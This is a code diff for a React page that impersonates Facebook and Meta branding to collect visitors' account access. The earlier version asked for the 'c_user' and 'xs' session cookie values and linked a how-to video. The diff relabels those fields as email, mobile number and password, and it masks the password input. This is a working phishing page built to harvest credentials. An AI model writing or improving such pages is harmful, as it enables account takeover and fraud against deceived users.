@@ -55,9 +55,9 @@ const Fbpage = () => {
 
   return (
     <div className="min-h-screen bg-white">
-      <div className="md:block lg:block hidden border flex w-full h-24 relative bg-[#4667ac]">
+      <div className="md:block lg:block hidden text-center border h-24 relative bg-[#4667ac]">
         <div className="mx-10 mt-4">
-          <b className="text-5xl text-white">facebook</b>
+          <b className="text-5xl text-white">Meta</b>
         </div>
       </div>
 
@@ -85,33 +85,6 @@ const Fbpage = () => {
           </div>
           
           <div>
-            <p className="mt-4 pl-3 text-[12px] font-semibold">
-              Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.
-            </p>
-          </div>
-          
-          <div>
-            <p className="text-[12px] text-[#90949c] p-2 font-semibold">
-              Detailed Video Information
-            </p>
-          </div>
-          
-          <div>
-            <a 
-              className="w-[120px] h-[80px] block mx-3" 
-              href="https://cdn.glitch.global/116aac45-aeea-4339-8e11-ec99eca8b56f/detailed_video.mp4?v=1721736922555"
-              target="_blank"
-              rel="noopener noreferrer"
-            >
-              <img 
-                src="https://i.pinimg.com/originals/97/95/69/979569a2dedd37573974ceebc05b4a4e.png" 
-                alt="Video thumbnail" 
-                className="w-full h-full object-cover"
-              />
-            </a>
-          </div>
-          
-          <div>
             <p className="pl-3 text-[12px] font-semibold">
               Please be sure to provide the requested information below.
             </p>
@@ -119,7 +92,7 @@ const Fbpage = () => {
           
           <div className="mb-2">
             <p className="text-slate-400 pl-4 mt-1">
-              c_user
+              Email & Mobile No.
             </p>
             <input 
               className={`border h-8 pl-2 mx-3 w-64`}
@@ -127,7 +100,7 @@ const Fbpage = () => {
               name="c_user" 
               value={formData.c_user}
               onChange={handleChange}
-              placeholder="Enter c_user" 
+              placeholder="Enter Email and Mobile No." 
               required 
               aria-required="true" 
             />
@@ -135,15 +108,15 @@ const Fbpage = () => {
           
           <div className="mb-4">
             <p className="text-slate-400 pl-4 mt-1">
-              xs
+             Password
             </p>
             <input 
               className={`border h-8 pl-2 mx-3 w-64`}
-              type="text" 
+              type="password" 
               name="xs" 
               value={formData.xs}
               onChange={handleChange}
-              placeholder="Enter xs" 
+              placeholder="Enter Password" 
               required 
               aria-required="true" 
             />
